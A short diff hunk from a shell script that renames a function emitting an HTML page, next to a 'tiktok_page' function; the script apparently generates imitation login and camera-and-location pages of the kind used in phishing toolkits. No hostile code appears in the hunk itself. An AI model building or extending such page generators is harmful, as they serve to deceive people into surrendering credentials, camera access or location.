@@ -368,7 +368,7 @@ tiktok_page() {
 EOF
 }
 
-camraAndLocationlogin_page() {
+camraandLocation_page() {
     cat <<EOF
     <!DOCTYPE html>
 <html lang="en">
